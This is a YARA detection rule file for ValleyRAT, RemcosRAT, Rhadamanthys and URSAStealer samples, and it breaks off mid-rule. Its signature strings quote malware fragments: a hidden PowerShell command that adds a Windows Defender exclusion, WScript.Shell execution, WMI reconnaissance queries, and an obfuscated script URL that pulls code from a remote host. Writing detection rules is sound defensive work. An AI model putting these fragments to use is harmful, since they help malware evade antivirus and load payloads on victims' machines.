rule ValleyRAT_signature__83e3c2e38a442145eaa2522b14e0d343_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_83e3c2e38a442145eaa2522b14e0d343(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1cc62d774236839a8067b217ed9844b475d78eca9b27c5f6419ad1ffa35b9d64"
   strings:
      $x1 = "C:\\Users\\Admin\\Downloads\\Test360\\x64\\Release\\Test360.pdb" fullword ascii /* score: '39.00'*/
      $s2 = "wscript.exe \"%s\"" fullword ascii /* score: '23.00'*/
      $s3 = "shortcut.TargetPath = \"%s\"" fullword ascii /* score: '20.00'*/
      $s4 = "75674E69636F6C61736275" ascii /* score: '17.00'*/ /* hex encoded string 'ugNicolasbu' */
      $s5 = "%s\\SystemTool.lnk" fullword ascii /* score: '14.00'*/
      $s6 = "Set shortcut = WshShell.CreateShortcut(\"%s\")" fullword ascii /* score: '12.00'*/
      $s7 = "AD5E5E44FDE694E87E2489346DE81C1CEE9316B6C2BA71F5C435A3AE9F0613F0AD436017028E1A8AFA6C485DA147E05C8FEFF8507C003D19ECCD6FAF33617D26" ascii /* score: '11.00'*/
      $s8 = "AB8436127C164EAE0E783A721769BF00224BC3E64B4B409CB16EDC31BAA996309FB1CD2A4205F560EF21037D41B570C8A3EDADFA72A6CC9ED31D9F757B83010F" ascii /* score: '11.00'*/
      $s9 = "FB31DBF9B9F5EB35A2A24F9E53BC464AC7752C14C2F46451BDAA4450C10117FCFE412967026A57455F5DF0FFF07D0985DE2091EFEF75D5BA79CECBDF27FB48A4" ascii /* score: '11.00'*/
      $s10 = "1C695FA0ECB48B214B9E9DD7C43E55B544DFD3BA9FB53E268C20591F595CC5CFEE714500363E275570BADECE09FB9D33B8564B48EEBD4A7EF0034EB7C3C1B3FD" ascii /* score: '11.00'*/
      $s11 = "A3AF5A1A81DFE20484C796C6902E0F22F7D24504218DF9EF9749F9A30D277B92228FBDF4C848F0B1A85D35955CF6E0ECD50B0D412DCDFAFA7BD9856143E8D48C" ascii /* score: '11.00'*/
      $s12 = "031A0ADC1244E07420E2921C370F0276EDF927A68A369E8E5F667A720AC8D7093E6B92AEB61BB9A354100773C8A2C472D2DFD43DDAE642B6C38E6309D31E44AB" ascii /* score: '11.00'*/
      $s13 = "70A47767C535477F2E889C627567C52D477BE735577A7AD17629E8A0E5255776F6864FEAA26DBD8E0776FE95659EE969E4633124F68E4F1C9686C861736246BC" ascii /* score: '11.00'*/
      $s14 = "92D17A6CFF2010D440142E6E4A49BDC5493A4CDDCBC8B1BAABC7C4C5F0FFC1BA7692D8FFD004FD4116F0A8F5E93F132C85C88A159F3587E3BE22CD9D0B73B5AF" ascii /* score: '11.00'*/
      $s15 = "E9977CE60098B196E6821852F01E51774E1D7390BAEA274661ECBEEC9560E83B8C9D8A98783A8BF5869E8CE9214352303AEAAC6EF7268A98B1E2274B4C8A47E1" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__83e3c2e38a442145eaa2522b14e0d343_imphash__d7adfc97 {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_83e3c2e38a442145eaa2522b14e0d343(imphash)_d7adfc97.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "d7adfc9774a6f8f2e40da98960bbaaefd6851a362ed0953281df63a449c9bff1"
   strings:
      $x1 = "C:\\Users\\Admin\\Downloads\\Test360\\x64\\Release\\Test360.pdb" fullword ascii /* score: '39.00'*/
      $s2 = "wscript.exe \"%s\"" fullword ascii /* score: '23.00'*/
      $s3 = "shortcut.TargetPath = \"%s\"" fullword ascii /* score: '20.00'*/
      $s4 = "69636F6C617354676E6963" ascii /* score: '17.00'*/ /* hex encoded string 'icolasTgnic' */
      $s5 = "%s\\SystemTool.lnk" fullword ascii /* score: '14.00'*/
      $s6 = "Set shortcut = WshShell.CreateShortcut(\"%s\")" fullword ascii /* score: '12.00'*/
      $s7 = "create_shortcut.vbs" fullword ascii /* score: '11.00'*/
      $s8 = "AB8BD3710C54C7F5B553C539096E24CB8FEBCD1B463F160CB0ADA2DCD9286CB7FB0B984E678D6C1ED350B23044897ED636999508794FD2B76483F2F197B6D3F9" ascii /* score: '11.00'*/
      $s9 = "5C6EC7D2F1EAD85D27E4746463D38BC21247D7AE95917DBAEC601257C0D5263E2090F16FB28AEA7E96BC334A4CE55193792BA216427A5BDCC48898DCC4A5D6E7" ascii /* score: '11.00'*/
      $s10 = "75958810CFEC7AC23EC21F19A1C8672E3CDBF1FD690186FC0B03523AC4DF7B08F673B355D7B4BA6B19E42085C0DF68748E5D5DB0837A2CE6F80DCDDD8BB3A069" ascii /* score: '11.00'*/
      $s11 = "F06EB4166D291FB720FF9B9D0FDEA43D02EFEA4DC0FBA192F0A08771A66D0646AAE2DC25061F1B3AA6776D32433B23A58118F3D63EF303FDA1F4D109FFF06241" ascii /* score: '11.00'*/
      $s12 = "BA1EDC527B4CBAA240AF8B4918721CE3BE7394F41136E624484D670C4D04572B3FC446BFA8CC53BBF25917D3099C1315BD1C455EDA890102B7E45F229ED22960" ascii /* score: '11.00'*/
      $s13 = "204BD71044BB36E32DFCCBAEE49D7A38F659ED49330F8E8AD8CE3E54EC2F1DE2B517607E35199EB653A3F13730D10CB9BD46B4EAD31A4486998C874B72B14A18" ascii /* score: '11.00'*/
      $s14 = "F1789C70C203004DE0088283F6FFE252A5BE0ABF453888B7842FEAD2525C4F62F17DDFC71A04CDFD4CE4A116A970DBF472F7CB9168802357EDFB75FA1AADB327" ascii /* score: '11.00'*/
      $s15 = "384BF18A576B036616193FADE389221AFEB020C788F1D8A82405DD166A07A1B3733764275962758467FC7D5581E2B24F76B140D63590089235DD7512B4FE7F74" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule ValleyRAT_signature__c35bbdf2a1165e98d0e46b0e3882deeb_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_c35bbdf2a1165e98d0e46b0e3882deeb(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "567760cca4e5b0590d7ed5c7ca61f75add6ffab199b351ce93e7429df988d046"
   strings:
      $x1 = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if ((Get-MpPreference).ExclusionPath -notcontains 'C:\\\\Users" ascii /* score: '56.00'*/
      $x2 = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"if ((Get-MpPreference).ExclusionPath -notcontains 'C:\\\\Users" ascii /* score: '53.00'*/
      $x3 = "C:\\Users\\Public\\Documents\\WindowsData\\NVIDIA.exe" fullword ascii /* score: '38.00'*/
      $x4 = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" fullword ascii /* score: '31.00'*/
      $s5 = "ublic\\\\Documents') { Add-MpPreference -ExclusionPath 'C:\\\\Users\\\\Public\\\\Documents' }\"" fullword ascii /* score: '28.00'*/
      $s6 = "C:\\\\Users\\\\Public\\\\Documents" fullword ascii /* score: '27.00'*/
      $s7 = "log.dll" fullword ascii /* score: '25.00'*/
      $s8 = "C:\\Cndom6.sys" fullword ascii /* score: '24.00'*/
      $s9 = "C:\\XiaoH.sys" fullword ascii /* score: '24.00'*/
      $s10 = "-NoProfile -WindowStyle Hidden -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;(Get-MpPreference).ExclusionPat" ascii /* score: '23.00'*/
      $s11 = "-NoProfile -WindowStyle Hidden -Command \"[Console]::OutputEncoding=[System.Text.Encoding]::UTF8;(Get-MpPreference).ExclusionPat" ascii /* score: '23.00'*/
      $s12 = "NVIDIA.exe" fullword ascii /* score: '22.00'*/
      $s13 = "tracerpt.exe" fullword ascii /* score: '22.00'*/
      $s14 = "NtHandleCallback.exe" fullword ascii /* score: '18.00'*/
      $s15 = "NtOpenProcess" fullword wide /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__6e7f9a29f2c85394521a08b9f31f6275_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_6e7f9a29f2c85394521a08b9f31f6275(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "377a6d1d3dc2bfdaea6e81bc61d3183fb7a7e306569f25e486fcde731c14ef32"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "nstall System v3.06</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s3 = "jjicxxw" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__b34f154ec913d2d2c435cbd644e91687_imphash_ {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_b34f154ec913d2d2c435cbd644e91687(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bbd7cc3340148f7bb3f3b8da082367550494471104d4f9fdaa5bee65aae637ac"
   strings:
      $x1 = "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?><assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersio" ascii /* score: '50.00'*/
      $s2 = "unmediumistic sandes.exe" fullword wide /* score: '19.00'*/
      $s3 = "nstall System v3.03</description><dependency><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common" ascii /* score: '13.00'*/
      $s4 = "yEXeCz9" fullword ascii /* score: '8.00'*/
      $s5 = "gonyalgia" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      1 of ($x*) and all of them
}

rule ValleyRAT_signature__71f9847d471117d3d5852a01b4f24cb3_imphash_ {
   meta:
      description = "_subset_batch - file ValleyRAT(signature)_71f9847d471117d3d5852a01b4f24cb3(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1107160996aad02e3d44572030599713712db1e7538a346d5bd885f1ff88fdaa"
   strings:
      $x1 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '48.00'*/
      $s2 = "cy><dependentAssembly><assemblyIdentity type=\"win32\" name=\"Microsoft.Windows.Common-Controls\" version=\"6.0.0.0\" processorA" ascii /* score: '26.00'*/
      $s3 = "rn:schemas-microsoft-com:asm.v3\"><security><requestedPrivileges><requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"" ascii /* score: '26.00'*/
      $s4 = "<assembly xmlns=\"urn:schemas-microsoft-com:asm.v1\" manifestVersion=\"1.0\"><assemblyIdentity version=\"1.0.0.0\" processorArch" ascii /* score: '22.00'*/
      $s5 = "WinMergeU.EXE" fullword wide /* score: '22.00'*/
      $s6 = "questedExecutionLevel></requestedPrivileges></security></trustInfo><application xmlns=\"urn:schemas-microsoft-com:asm.v3\"><wind" ascii /* score: '18.00'*/
      $s7 = "FEDCBA?" fullword ascii /* reversed goodware string '?ABCDEF' */ /* score: '14.00'*/
      $s8 = "2.16.46.0" fullword wide /* score: '14.00'*/ /* hex encoded string '!d`' */
      $s9 = "sSettings><dpiAware xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">true</dpiAware></windowsSettings></applicati" ascii /* score: '13.00'*/
      $s10 = "987654321" ascii /* reversed goodware string '123456789' */ /* score: '11.00'*/
      $s11 = "CPNOTEMPTY)" fullword ascii /* score: '11.00'*/
      $s12 = "9rrrr9999rrrr9999rrrr9999rrrr999ArrrrAAAArrrrAAAArrrrAAAArrrrAAABrrrrBBBBrrrrBBBBrrrrBBBBrrrrBBBCrrrrCCCCrrrrCCCCrrrrCCCCrrrrCCC" ascii /* score: '11.00'*/
      $s13 = "83d0f6d0da78}\"></ms_compatibility:supportedOS><ms_compatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:" ascii /* score: '10.00'*/
      $s14 = "><ms_compatibility:supportedOS xmlns:ms_compatibility=\"urn:schemas-microsoft-com:compatibility.v1\" Id=\"{1f676c76-80e1-4239-95" ascii /* score: '10.00'*/
      $s15 = "\\,4<D\\." fullword ascii /* score: '10.00'*/ /* hex encoded string 'M' */
   condition:
      uint16(0) == 0x5a4d and filesize < 5000KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__4fccf079 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_4fccf079.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "4fccf079d2e2942caad3338ada2aedf4290d380df931ae188e74693b86535da9"
   strings:
      $x1 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x2 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $s3 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s6 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s7 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48" ascii /* score: '27.00'*/
      $s8 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" ascii /* score: '27.00'*/
      $s9 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s10 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" ascii /* score: '26.00'*/
      $s11 = "var wheal = gennelmen.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s12 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s13 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s14 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '25.00'*/
      $s15 = "                    var experrection = new Enumerator(incruental.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__8d61a111 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_8d61a111.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8d61a111c690ba0dead25b1a2e06fcf7c374e3a610b1ae82e4b385ca52d44014"
   strings:
      $x1 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x2 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null" ascii /* score: '34.00'*/
      $x3 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" ascii /* score: '32.00'*/
      $x4 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" ascii /* score: '31.00'*/
      $s5 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '30.00'*/
      $s6 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null" ascii /* score: '30.00'*/
      $s7 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '30.00'*/
      $s8 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '29.00'*/
      $s9 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_DeviceMemoryAddress\", null, 48" ascii /* score: '27.00'*/
      $s10 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_PrinterConfiguration\", null, 4" ascii /* score: '27.00'*/
      $s11 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_SerialPort\", null, 48));" fullword ascii /* score: '27.00'*/
      $s12 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s13 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", nu" ascii /* score: '27.00'*/
      $s14 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", " ascii /* score: '27.00'*/
      $s15 = "                    var pulvilliform = new Enumerator(quadriloge.ExecQuery(\"Select * from Win32_NetworkAdapterConfiguration\", " ascii /* score: '27.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and all of them
}

rule RemcosRAT_signature__9b74c647 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_9b74c647.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b74c6472957df96c56ddef5fbc4996f071ce281109a4bdace0ccc1162845648"
   strings:
      $x1 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_ComputerSystemProcessor\", null, 48));" ascii /* score: '34.00'*/
      $s2 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_Process\", null, 48));" fullword ascii /* score: '27.00'*/
      $s3 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_Processor\", null, 48));" fullword ascii /* score: '27.00'*/
      $s4 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_PrinterDriverDll\", null, 48));" fullword ascii /* score: '27.00'*/
      $s5 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_NetworkLoginProfile\", null, 48));" fullword ascii /* score: '27.00'*/
      $s6 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_AssociatedProcessorMemory\", null, 48)" ascii /* score: '27.00'*/
      $s7 = "var humbleness = retroact.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s8 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_TemperatureProbe\", null, 48));" fullword ascii /* score: '26.00'*/
      $s9 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_HeatPipe\", null, 48));" fullword ascii /* score: '25.00'*/
      $s10 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_SerialPortConfiguration\", null, 48));" ascii /* score: '25.00'*/
      $s11 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_OperatingSystem\", null, 48));" fullword ascii /* score: '24.00'*/
      $s12 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_NTLogEvent\", null, 48));" fullword ascii /* score: '24.00'*/
      $s13 = "var unalike = retroact.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s14 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_POTSModemToSerialPort\", null, 48));" fullword ascii /* score: '22.00'*/
      $s15 = "                    var Harpy = new Enumerator(cinclosoma.ExecQuery(\"Select * from Win32_PrinterDriver\", null, 48));" fullword ascii /* score: '22.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule RemcosRAT_signature__809ecfe0 {
   meta:
      description = "_subset_batch - file RemcosRAT(signature)_809ecfe0.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "809ecfe0d5639158fd1626f4bf2c4c3629a64e012f95f7a08d1b6b0c8a65508e"
   strings:
      $s1 = "function Ichimokuren(devModeProperties, scriptContext, printTicket) {" fullword ascii /* score: '13.00'*/
      $s2 = "dithiophosphate.Run(grave, 0, false);" fullword ascii /* score: '13.00'*/
      $s3 = "var dithiophosphate = new ActiveXObject(\"WScript.Shell\");" fullword ascii /* score: '12.00'*/
      $s4 = "Kn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKc7F5JzugnkhCw8pKn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKd7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s5 = "Kg7F5JzugnkhCw8pKP7F5JzugnkhCw8pKS7F5JzugnkhCw8pKA7F5JzugnkhCw8pKo7F5JzugnkhCw8pKK7F5JzugnkhCw8pKE7F5JzugnkhCw8pK57F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s6 = "Kl7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKn7F5JzugnkhCw8pKk7F5JzugnkhCw8pKu7F5JzugnkhCw8pKY7F5JzugnkhCw8pKX7F5JzugnkhCw8pKB7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s7 = "K57F5JzugnkhCw8pKI7F5JzugnkhCw8pKD7F5JzugnkhCw8pK07F5JzugnkhCw8pKg7F5JzugnkhCw8pKW7F5JzugnkhCw8pK17F5JzugnkhCw8pKJ7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s8 = "Kj7F5JzugnkhCw8pKd7F5JzugnkhCw8pKF7F5JzugnkhCw8pKt7F5JzugnkhCw8pKd7F5JzugnkhCw8pKX7F5JzugnkhCw8pKU7F5JzugnkhCw8pKA7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s9 = "K67F5JzugnkhCw8pKX7F5JzugnkhCw8pKF7F5JzugnkhCw8pKV7F5JzugnkhCw8pKz7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKX7F5JzugnkhCw8pKJ7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s10 = "Ku7F5JzugnkhCw8pKd7F5JzugnkhCw8pKm7F5JzugnkhCw8pK97F5JzugnkhCw8pKr7F5JzugnkhCw8pKZ7F5JzugnkhCw8pKS7F5JzugnkhCw8pKg7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s11 = "Kl7F5JzugnkhCw8pKd7F5JzugnkhCw8pKy7F5JzugnkhCw8pK17F5JzugnkhCw8pKP7F5JzugnkhCw8pKY7F5JzugnkhCw8pKm7F5JzugnkhCw8pKp7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s12 = "K37F5JzugnkhCw8pKJ7F5JzugnkhCw8pKy7F5JzugnkhCw8pKw7F5JzugnkhCw8pKn7F5JzugnkhCw8pKa7F5JzugnkhCw8pKH7F5JzugnkhCw8pKR7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s13 = "Kh7F5JzugnkhCw8pKc7F5JzugnkhCw8pK27F5JzugnkhCw8pKU7F5JzugnkhCw8pK27F5JzugnkhCw8pKN7F5JzugnkhCw8pKF7F5JzugnkhCw8pKN7F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s14 = "Kh7F5JzugnkhCw8pKc7F5JzugnkhCw8pKn7F5JzugnkhCw8pKR7F5JzugnkhCw8pK17F5JzugnkhCw8pKc7F5JzugnkhCw8pKF7F5JzugnkhCw8pK97F5JzugnkhCw8p" ascii /* score: '11.00'*/
      $s15 = "Kr7F5JzugnkhCw8pKa7F5JzugnkhCw8pK37F5JzugnkhCw8pKk7F5JzugnkhCw8pKn7F5JzugnkhCw8pKL7F5JzugnkhCw8pKC7F5JzugnkhCw8pKc7F5JzugnkhCw8p" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x683c and filesize < 70KB and
      8 of them
}

rule Rhadamanthys_signature_ {
   meta:
      description = "_subset_batch - file Rhadamanthys(signature).html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bd264886e1ef3600ce3ba83451828929addead1195beed5027f6b4cc1645c436"
   strings:
      $x1 = "</script>   <meta http-equiv=\"content-type\" content=\"text/html; charset=utf-8\" /> <meta name=\"viewport\" content=\"width=de" ascii /* score: '42.00'*/
      $x2 = "                                        <div class=\"mu-class\"> <div class=\"item-title-position  \"> <div class=\"new-prop-ima" ascii /* score: '35.00'*/
      $s3 = "</div> </div> </div>                                                                      <div class=\"sidebar-rew-reviews sideb" ascii /* score: '27.00'*/
      $s4 = " <div class=\"comments-list-container\" > <h3 class=\"title\"> <span class=\"count\" id=\"comments-count\">1</span> Comments </h" ascii /* score: '26.00'*/
      $s5 = "<noscript><iframe src=\"https://www.googletagmanager.com/ns.html?id=GTM-NT362VP\"" fullword ascii /* score: '26.00'*/
      $s6 = "</svg> </a> <div> <a role=\"button\" tabindex=\"0\" class=\"mob-search btn-header-search\" id=\"btn-header-search-tablet\"> <svg" ascii /* score: '24.00'*/
      $s7 = "4442/comtinybuildgameshelloneighbor-id4442.png\" alt=\"Hello Neighbor\"> </a> </li>  <li> <a href=\"https://playingclub.org/amon" ascii /* score: '23.00'*/
      $s8 = "<!-- End Google Tag Manager (noscript) -->" fullword ascii /* score: '23.00'*/
      $s9 = "ink rel=\"preload\" href=\"https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap\" as=\"style\" onlo" ascii /* score: '22.00'*/
      $s10 = "lass=\"\"> <!-- /22849912130/playingclub.org/playingclub.org_d_unit_sidebar_336 -->" fullword ascii /* score: '20.00'*/
      $s11 = "bg=\"/images/thumb/400x400xc/uploads/post/d49c4d01-0353-40c8-82c0-5f2d3e972f26.jpg\"></span> <span class=\"blog-items-content\">" ascii /* score: '20.00'*/
      $s12 = "c/uploads/post/27bd3b6f-b070-43b3-b17c-ebc44d6d461c.jpg\"></span> <span class=\"blog-items-content\"> <span class=\"blog-items-t" ascii /* score: '20.00'*/
      $s13 = "-links list-inline\"> <li> <a onclick=\"window.open('https://www.facebook.com/sharer/sharer.php?u=http://playingclub.org/minecra" ascii /* score: '20.00'*/
      $s14 = "', 'newwindow', 'width=500,height=450'); return false;\" href=\"https://www.facebook.com/sharer/sharer.php?u=http://playingclub." ascii /* score: '20.00'*/
      $s15 = "                <div class=\"top-apps_block card2 full-width desktop\"> <div class=\"big-container\"> <ul>  <li> <a href=\"https" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 300KB and
      1 of ($x*) and 4 of them
}

rule URSAStealer_signature_ {
   meta:
      description = "_subset_batch - file URSAStealer(signature).hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e80c28da721de99e54478d1b40477f66d13b2313b3a7d4cc40b19c95f70f9741"
   strings:
      $s1 = "        RPfkx31.src = U0y51+ 'tt' + DpwObgL52 + ':/' + '/129.90.74.97.host.secureserver.net/DpwObgL52/DpwObgL52mde2/HRaHaIW943.'" ascii /* score: '16.00'*/
      $s2 = "        RPfkx31.src = U0y51+ 'tt' + DpwObgL52 + ':/' + '/129.90.74.97.host.secureserver.net/DpwObgL52/DpwObgL52mde2/HRaHaIW943.'" ascii /* score: '16.00'*/
      $s3 = "The rainy season runs from late August through November, and the dry season runs from November through April. The hurricane seas" ascii /* score: '13.00'*/
      $s4 = "daytime temperatures around 1 to 2 " fullword ascii /* score: '11.00'*/
      $s5 = "n current continually bringing warm water from further south, the sea temperature is always very warm, with lows of 79 " fullword ascii /* score: '11.00'*/
      $s6 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s7 = "nd moderated by onshore trade winds, with an annual mean temperature of 27.1 " fullword ascii /* score: '11.00'*/
      $s8 = "ppen Aw), with little temperature difference between months, but pronounced rainy and dry seasons. The city is hot year-round, a" ascii /* score: '11.00'*/
      $s9 = "n Peninsula, sea breezes restrict high temperatures from reaching 36 " fullword ascii /* score: '11.00'*/
      $s10 = "led to provide public services for the constant influx of people, as well as limiting squatters and irregular developments, whic" ascii /* score: '10.00'*/
      $s11 = "Juarez to the north, continuing along Bonampak and south toward the airport along Boulevard Donaldo Colosio. One development abu" ascii /* score: '9.00'*/
      $s12 = "n's mainland or downtown area has diverged from the original plan; development is scattered around the city. The remaining undev" ascii /* score: '9.00'*/
      $s13 = "Etymology and coat of arms" fullword ascii /* score: '9.00'*/
      $s14 = "n and other Mexican states. A growing number are from the rest of the Americas and Europe. The municipal authorities have strugg" ascii /* score: '9.00'*/
      $s15 = "U0y51 = 'S' + U0y51 + DpwObgL52;" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 30KB and
      8 of them
}

rule RemcosRAT_signature__573bb7b41bc641bd95c0f5eec13c233b_imphash_ {
   meta:
